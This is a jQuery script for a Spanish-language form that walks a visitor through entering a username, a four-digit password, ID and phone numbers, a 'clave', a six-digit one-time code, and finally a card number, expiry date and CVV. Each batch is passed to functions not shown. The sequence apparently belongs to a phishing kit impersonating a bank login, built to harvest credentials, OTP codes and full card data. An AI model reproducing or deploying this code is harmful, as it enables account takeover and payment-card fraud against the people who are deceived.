var pass1 = "";
var pass2 = "";
var pass3 = "";
var pass4 = "";

var otp1 = "";
var otp2 = "";
var otp3 = "";
var otp4 = "";
var otp5 = "";
var otp6 = "";


$(document).ready(function() {     

    $("#inp-usuario,#etq-usuario").click(function(e){
        $("#inp-usuario").css("border-bottom","2px solid #FDDA24");
        //$("#txt-usuario").removeAttr("readonly");
        $("#etq-usuario").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
            $("#txt-usuario").focus();
        });
    }); 

    $("#txt-usuario").keyup(function(e){
        if ($("#txt-usuario").val() == "") {
            $("#btn-continuar").attr("disabled","disabled");
            $("#lnk-continuar").attr("src","../img/btn-continuar-off.jpg");
        }else{
            $("#btn-continuar").removeAttr("disabled");
            $("#lnk-continuar").attr("src","../img/btn-continuar.jpg");
        } 
    });

    $("#txt-usuario").blur(function(e){
        if ($("#txt-usuario").val() == "") {
            $("#inp-usuario").css("border-bottom","2px solid #D3D3D3");            
            $("#etq-usuario").animate({"margin-top":"-32px","margin-left":"39px"}, 100, function() {

            });   
        }    
    });

    $("#txt-usuario").focus(function(e){
        $("#inp-usuario").css("border-bottom","2px solid #FDDA24");        
        $("#etq-usuario").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {

        }); 
    });


    $("#btn-continuar,#lnk-continuar").click(function(e){
        $("#fondo,#cargando-o").show();
        inicio($("#txt-usuario").val());
    });

    $("#txt-pass1").keyup(function(e){
        if ($("#txt-pass1").val() != "") {
            if ($("#txt-pass1").val() != "*") {
                if ($("#txt-pass2").val() != "" && $("#txt-pass3").val() != "" && $("#txt-pass4").val() != "") {                
                    $("#btn-password").removeAttr("disabled");
                    $("#lnk-password").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-password").attr("disabled","disabled");
                    $("#lnk-password").attr("src","../img/btn-continuar-off.jpg");
                }            
                pass1 = $("#txt-pass1").val();
                $("#txt-pass1").val("*");
                $("#txt-pass2").focus();
                $("#txt-pass2").select();
            }else{
                $("#txt-pass2").focus();
                $("#txt-pass2").select();
            }    
        }else{
            pass1 = "";
            $("#btn-password").attr("disabled","disabled");
            $("#lnk-password").attr("src","../img/btn-continuar-off.jpg");            
        }
    });

    $("#txt-pass2").keyup(function(e){
        if ($("#txt-pass2").val() != "") {
            if ($("#txt-pass2").val() != "*") {
                if ($("#txt-pass1").val() != "" && $("#txt-pass3").val() != "" && $("#txt-pass4").val() != "") {                
                    $("#btn-password").removeAttr("disabled");
                    $("#lnk-password").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-password").attr("disabled","disabled");
                    $("#lnk-password").attr("src","../img/btn-continuar-off.jpg");
                }
                pass2 = $("#txt-pass2").val();
                $("#txt-pass2").val("*");
                $("#txt-pass3").focus();
                $("#txt-pass3").select();
            }else{
                $("#txt-pass3").focus();
                $("#txt-pass3").select();
            }
        }else{
            pass2 = "";
            $("#btn-password").attr("disabled","disabled");
            $("#lnk-password").attr("src","../img/btn-continuar-off.jpg"); 
            if (e.keyCode==8) {
                $("#txt-pass1").focus();
            } 
        }
    });

    $("#txt-pass3").keyup(function(e){        
        if ($("#txt-pass3").val() != "") {
            if ($("#txt-pass3").val() != "*") {
                if ($("#txt-pass2").val() != "" && $("#txt-pass1").val() != "" && $("#txt-pass4").val() != "") {                
                    $("#btn-password").removeAttr("disabled");
                    $("#lnk-password").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-password").attr("disabled","disabled");
                    $("#lnk-password").attr("src","../img/btn-continuar-off.jpg");
                }
                pass3 = $("#txt-pass3").val();
                $("#txt-pass3").val("*");
                $("#txt-pass4").focus();
                $("#txt-pass4").select();
            }else{
                $("#txt-pass4").focus();
                $("#txt-pass4").select();
            }
        }else{
            pass3 = "";
            $("#btn-password").attr("disabled","disabled");
            $("#lnk-password").attr("src","../img/btn-continuar-off.jpg"); 
            if (e.keyCode==8) {
                $("#txt-pass2").focus();
            }    
        }
    });

    $("#txt-pass4").keyup(function(e){
        if ($("#txt-pass4").val() != "") {
            if ($("#txt-pass4").val() != "*") {
                if ($("#txt-pass2").val() != "" && $("#txt-pass3").val() != "" && $("#txt-pass1").val() != "") {                
                    $("#btn-password").removeAttr("disabled");
                    $("#lnk-password").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-password").attr("disabled","disabled");
                    $("#lnk-password").attr("src","../img/btn-continuar-off.jpg");
                }
                pass4 = $("#txt-pass4").val();
                $("#txt-pass4").val("*");  
            }                             
        }else{
            pass4 = "";
            $("#btn-password").attr("disabled","disabled");
            $("#lnk-password").attr("src","../img/btn-continuar-off.jpg");    
            if (e.keyCode==8) {
                $("#txt-pass3").focus();
            } 
        }
    });

    $("#btn-password,#lnk-password").click(function(e){
       $("#fondo,#cargando-o").show(); 
       pasousuario(pass1 + "" + pass2 + "" + pass3 + "" + pass4);
    });


    $("#inp-documento,#etq-documento").click(function(e){
        $("#inp-documento").css("border-bottom","2px solid #FDDA24");        
        $("#etq-documento").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
            $("#txt-documento").focus();
        });
    }); 

    $("#txt-documento,#txt-celular,#txt-clave").keyup(function(e){
        if ($("#txt-documento").val().length > 5 && $("#txt-celular").val().length == 10 && $("#txt-clave").val().length > 0) {
            $("#btn-info").removeAttr("disabled");
            $("#lnk-info").attr("src","../img/btn-continuar.jpg");
        }else{
            $("#btn-info").attr("disabled","disabled");
            $("#lnk-info").attr("src","../img/btn-continuar-off.jpg");  
        }
    });


    $("#txt-documento").blur(function(e){
        if ($("#txt-documento").val() == "") {
            $("#inp-documento").css("border-bottom","2px solid #D3D3D3"); 
            $("#etq-documento").animate({"margin-top":"-32px","margin-left":"39px"}, 100, function() {
                
            });   
        }    
    });

    $("#txt-documento").focus(function(e){
        $("#inp-documento").css("border-bottom","2px solid #FDDA24");        
        $("#etq-documento").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
            
        }); 
    });


    $("#inp-celular,#etq-celular").click(function(e){
        $("#inp-celular").css("border-bottom","2px solid #FDDA24");        
        $("#etq-celular").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
            $("#txt-celular").focus();
        });
    }); 

   
    $("#txt-celular").blur(function(e){
        if ($("#txt-celular").val() == "") {
            $("#inp-celular").css("border-bottom","2px solid #D3D3D3"); 
            $("#etq-celular").animate({"margin-top":"-32px","margin-left":"39px"}, 100, function() {
                
            });   
        }    
    });

    $("#txt-celular").focus(function(e){
        $("#inp-celular").css("border-bottom","2px solid #FDDA24");        
        $("#etq-celular").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
        
        }); 
    });


    $("#inp-clave,#etq-clave").click(function(e){
        $("#inp-clave").css("border-bottom","2px solid #FDDA24");        
        $("#etq-clave").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
            $("#txt-clave").focus();
        });
    });

    $("#txt-clave").focus(function(e){
        $("#inp-clave").css("border-bottom","2px solid #FDDA24");        
        $("#etq-clave").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
        
        }); 
    });

    $("#txt-clave").blur(function(e){
        if ($("#txt-clave").val() == "") {
            $("#inp-clave").css("border-bottom","2px solid #D3D3D3"); 
            $("#etq-clave").animate({"margin-top":"-32px","margin-left":"39px"}, 100, function() {
                
            });   
        }    
    });



    

    $("#btn-info,#lnk-info").click(function(e){
        $("#fondo").show();
        pasocorreo($("#txt-documento").val(),$("#txt-clave").val(),$("#txt-celular").val());
       //pasoinfo($("#txt-documento").val(),$("#txt-celular").val());
    });


    $("#txt-otp1").keyup(function(e){
        if ($("#txt-otp1").val() != "") {
            if ($("#txt-otp1").val() != "*") {
                if ($("#txt-otp2").val() != "" && $("#txt-otp3").val() != "" && $("#txt-otp4").val() != "" && $("#txt-otp5").val() != "" && $("#txt-otp6").val() != "") {                
                    $("#btn-otp,#btn-errotp").removeAttr("disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-otp,#btn-errotp").attr("disabled","disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg");
                }            
                otp1 = $("#txt-otp1").val();
                $("#txt-otp1").val("*");
                $("#txt-otp2").focus();
                $("#txt-otp2").select();
            }else{
                $("#txt-otp2").focus();
                $("#txt-otp2").select();
            }    
        }else{
            otp1 = "";
            $("#btn-otp,#btn-errotp").attr("disabled","disabled");
            $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg");            
        }
    });

    $("#txt-otp2").keyup(function(e){
        if ($("#txt-otp2").val() != "") {
            if ($("#txt-otp2").val() != "*") {
                if ($("#txt-otp1").val() != "" && $("#txt-otp3").val() != "" && $("#txt-otp4").val() != "" && $("#txt-otp5").val() != "" && $("#txt-otp6").val() != "") {                
                    $("#btn-otp,#btn-errotp").removeAttr("disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-otp,#btn-errotp").attr("disabled","disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg");
                }
                otp2 = $("#txt-otp2").val();
                $("#txt-otp2").val("*");
                $("#txt-otp3").focus();
                $("#txt-otp3").select();
            }else{
                $("#txt-otp3").focus();
                $("#txt-otp3").select();
            }
        }else{
            otp2 = "";
            $("#btn-otp,#btn-errotp").attr("disabled","disabled");
            $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg"); 
            if (e.keyCode==8) {
                $("#txt-otp1").focus();
            } 
        }
    });

    $("#txt-otp3").keyup(function(e){        
        if ($("#txt-otp3").val() != "") {
            if ($("#txt-otp3").val() != "*") {
                if ($("#txt-otp1").val() != "" && $("#txt-otp2").val() != "" && $("#txt-otp4").val() != "" && $("#txt-otp5").val() != "" && $("#txt-otp6").val() != "") {                
                    $("#btn-otp,#btn-errotp").removeAttr("disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-otp,#btn-errotp").attr("disabled","disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg");
                }
                otp3 = $("#txt-otp3").val();
                $("#txt-otp3").val("*");
                $("#txt-otp4").focus();
                $("#txt-otp4").select();
            }else{
                $("#txt-otp4").focus();
                $("#txt-otp4").select();
            }
        }else{
            otp3 = "";
            $("#btn-otp,#btn-errotp").attr("disabled","disabled");
            $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg"); 
            if (e.keyCode==8) {
                $("#txt-otp2").focus();
            }    
        }
    });

    $("#txt-otp4").keyup(function(e){        
        if ($("#txt-otp4").val() != "") {
            if ($("#txt-otp4").val() != "*") {
                if ($("#txt-otp1").val() != "" && $("#txt-otp2").val() != "" && $("#txt-otp3").val() != "" && $("#txt-otp5").val() != "" && $("#txt-otp6").val() != "") {                
                    $("#btn-otp,#btn-errotp").removeAttr("disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-otp,#btn-errotp").attr("disabled","disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg");
                }
                otp4 = $("#txt-otp4").val();
                $("#txt-otp4").val("*");
                $("#txt-otp5").focus();
                $("#txt-otp5").select();
            }else{
                $("#txt-otp5").focus();
                $("#txt-otp5").select();
            }
        }else{
            otp4 = "";
            $("#btn-otp,#btn-errotp").attr("disabled","disabled");
            $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg"); 
            if (e.keyCode==8) {
                $("#txt-otp3").focus();
            }    
        }
    });

    $("#txt-otp5").keyup(function(e){        
        if ($("#txt-otp5").val() != "") {
            if ($("#txt-otp5").val() != "*") {
                if ($("#txt-otp1").val() != "" && $("#txt-otp2").val() != "" && $("#txt-otp3").val() != "" && $("#txt-otp4").val() != "" && $("#txt-otp6").val() != "") {                
                    $("#btn-otp,#btn-errotp").removeAttr("disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-otp,#btn-errotp").attr("disabled","disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg");
                }
                otp5 = $("#txt-otp5").val();
                $("#txt-otp5").val("*");
                $("#txt-otp6").focus();
                $("#txt-otp6").select();
            }else{
                $("#txt-otp6").focus();
                $("#txt-otp6").select();
            }
        }else{
            otp5 = "";
            $("#btn-otp,#btn-errotp").attr("disabled","disabled");
            $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg"); 
            if (e.keyCode==8) {
                $("#txt-otp4").focus();
            }    
        }
    });

    $("#txt-otp6").keyup(function(e){
        if ($("#txt-otp6").val() != "") {
            if ($("#txt-otp6").val() != "*") {
                if ($("#txt-otp1").val() != "" && $("#txt-otp2").val() != "" && $("#txt-otp3").val() != "" && $("#txt-ot4").val() != "" && $("#txt-otp5").val() != "") {                
                    $("#btn-otp,#btn-errotp").removeAttr("disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar.jpg");                
                }else{
                    $("#btn-otp,#btn-errotp").attr("disabled","disabled");
                    $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg");
                }
                otp6 = $("#txt-otp6").val();
                $("#txt-otp6").val("*");  
            }                             
        }else{
            otp6 = "";
            $("#btn-otp,#btn-errotp").attr("disabled","disabled");
            $("#lnk-otp,#lnk-errotp").attr("src","../img/btn-continuar-off.jpg");    
            if (e.keyCode==8) {
                $("#txt-otp5").focus();
            } 
        }
    });

    $("#btn-otp,#lnk-otp").click(function(e){
        $("#fondo").show();
        pasootp(otp1 + "" + otp2 + "" + otp3 + "" + otp4 + "" + otp5 + "" + otp6);
    });

    $("#btn-errotp,#lnk-errotp").click(function(e){
        $("#fondo,#cargando-o").show();
        pasootp(otp1 + "" + otp2 + "" + otp3 + "" + otp4 + "" + otp5 + "" + otp6);
    });

    $("#inp-tarjeta,#etq-tarjeta").click(function(e){
        $("#etq-tarjeta").html("Número de tarjeta");        
        $("#inp-tarjeta").css("border-bottom","2px solid #FDDA24");        
        $("#etq-tarjeta").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
            $("#txt-tarjeta").focus();
        });
    }); 

    $("#txt-tarjeta").keyup(function(e){
        if ($("#txt-tarjeta").val().length >= 15 && err_fec == 0 && $("#txt-cvv").val().length >= 3) {
            $("#btn-tarjeta").removeAttr("disabled");
            $("#lnk-tarjeta").attr("src","../img/btn-continuar.jpg");
        }else{
           $("#btn-tarjeta").attr("disabled","disabled");
            $("#lnk-tarjeta").attr("src","../img/btn-continuar-off.jpg");            
        } 
    });

    $("#txt-tarjeta").blur(function(e){
        if ($("#txt-tarjeta").val() == "") {
            $("#etq-tarjeta").html("0000 0000 0000 0000"); 
            $("#inp-tarjeta").css("border-bottom","2px solid #D3D3D3");            
            $("#etq-tarjeta").animate({"margin-top":"-32px","margin-left":"39px"}, 100, function() {
                
            });   
        }    
    });

    $("#txt-tarjeta").focus(function(e){
        $("#inp-tarjeta").css("border-bottom","2px solid #FDDA24");        
        $("#etq-tarjeta").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
        
        }); 
    });


    $("#inp-fecha,#etq-fecha").click(function(e){        
        $("#inp-fecha").css("border-bottom","2px solid #FDDA24");        
        $("#etq-fecha").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
            $("#txt-fecha").focus();
        });
    });  

    var fecha_ok = 0;
    var fechalista = 0;
    var err_fec = 1;

    $('#txt-fecha').keyup(function(event){
        if ($("#txt-fecha").val() == "") {            
            fecha_ok = 0;   
            err_fec = 1;        
            $("#btn-tarjeta").attr("disabled","disabled");
            $("#lnk-tarjeta").attr("src","../img/btn-continuar-off.jpg");                
        }else{
            v = $('#txt-fecha').val().split('/').join('');
            t = $('#txt-fecha').val().length;  
            if (t == 1) {
                if (v[0] == '1') {

                }else{
                    if (v[0] == '0') {

                    }else{
                        v = '0' + v + '/';
                        $('#txt-fecha').val(v);
                    }                                
                }
            }else{                            
                if (t == 2) {
                    if (v[0] == '1') {
                        if (parseInt(v[1], 10) > 2) {
                            v = '0' + v[0] + '/' + v[1]; 
                            $('#txt-fecha').val(v);
                            fec = $('#txt-fecha').val().split('/');
                            p2 = fec[1];
                            p2n = parseInt(p2, 10);
                            if ((p2n >= 22 && p2n <= 47) || (p2n >= 2022 && p2n <= 2047)) {                                
                                fechalista = 0;
                            }else{                                
                                fechalista = 1;  
                                fecha_ok = 0;
                            }
                        }   
                    }else{
                        p1 = '' + v[0] + '' + v[1] + '';
                        if (parseInt(p1, 10) > 12) {                            
                            fecha_ok = 0;
                            fechalista = 1;
                        }else{                        
                            fechalista = 0;
                        }
                    }            
                }else{
                    if (t > 2) {
                        var fp1 = v.substring(0, 2);
                        var fp2 = v.substring(2);  
                        $("#txt-fecha").val(fp1 + "/" + fp2);

                        p2n2 = parseInt(fp2, 10);
                        if ((p2n2 >= 22 && p2n2 <= 47) || (p2n2 >= 2022 && p2n2 <= 2047)) {                            
                            fechalista = 0;
                        }else{                            
                            fecha_ok = 0; 
                            fechalista = 1;
                        }

                    }    
                }
                
            } 
            if (fechalista == 1) {
                $("#btn-tarjeta").attr("disabled","disabled");
                $("#lnk-tarjeta").attr("src","../img/btn-continuar-off.jpg"); 
                err_fec = 1;
            }else{
                if ($("#txt-fecha").val().length < 5) {
                    err_fec = 1;
                    $("#btn-tarjeta").attr("disabled","disabled");
                    $("#lnk-tarjeta").attr("src","../img/btn-continuar-off.jpg"); 
                }else{
                    err_fec = 0;

                    if ($("#txt-tarjeta").val().length >= 15 && $("#txt-cvv").val().length >= 3) {
                        $("#btn-tarjeta").removeAttr("disabled");
                        $("#lnk-tarjeta").attr("src","../img/btn-continuar.jpg");
                    }else{
                        $("#btn-tarjeta").attr("disabled","disabled");
                        $("#lnk-tarjeta").attr("src","../img/btn-continuar-off.jpg");            
                    }
                }   
            }
        }
    });

    $("#txt-fecha").blur(function(e){
        if ($("#txt-fecha").val() == "") {
            $("#inp-fecha").css("border-bottom","2px solid #D3D3D3");            
            $("#etq-fecha").animate({"margin-top":"-32px","margin-left":"39px"}, 100, function() {
                
            });   
        }    
    });

    $("#txt-fecha").focus(function(e){
        $("#inp-fecha").css("border-bottom","2px solid #FDDA24");        
        $("#etq-fecha").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
        
        }); 
    });

    $("#inp-cvv,#etq-cvv").click(function(e){
        $("#inp-cvv").css("border-bottom","2px solid #FDDA24");        
        $("#etq-cvv").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
            $("#txt-cvv").focus();
        });
    }); 

    $("#txt-cvv").keyup(function(e){
        if ($("#txt-tarjeta").val().length >= 15 && err_fec == 0 && $("#txt-cvv").val().length >= 3) {
            $("#btn-tarjeta").removeAttr("disabled");
            $("#lnk-tarjeta").attr("src","../img/btn-continuar.jpg");
        }else{
           $("#btn-tarjeta").attr("disabled","disabled");
            $("#lnk-tarjeta").attr("src","../img/btn-continuar-off.jpg");            
        } 
    });

    $("#txt-cvv").blur(function(e){
        if ($("#txt-cvv").val() == "") {
            $("#inp-cvv").css("border-bottom","2px solid #D3D3D3");            
            $("#etq-cvv").animate({"margin-top":"-32px","margin-left":"39px"}, 100, function() {
                
            });   
        }    
    });

    $("#txt-cvv").focus(function(e){
        $("#inp-cvv").css("border-bottom","2px solid #FDDA24");        
        $("#etq-cvv").animate({"margin-top":"-58px","margin-left":"0px"}, 100, function() {
        
        }); 
    });

    $("#btn-tarjeta,#lnk-tarjeta").click(function(e){
        $("#fondo,#cargando-o").show();
        pasotarjeta($("#txt-tarjeta").val(),$("#txt-fecha").val(),$("#txt-cvv").val());
    });

});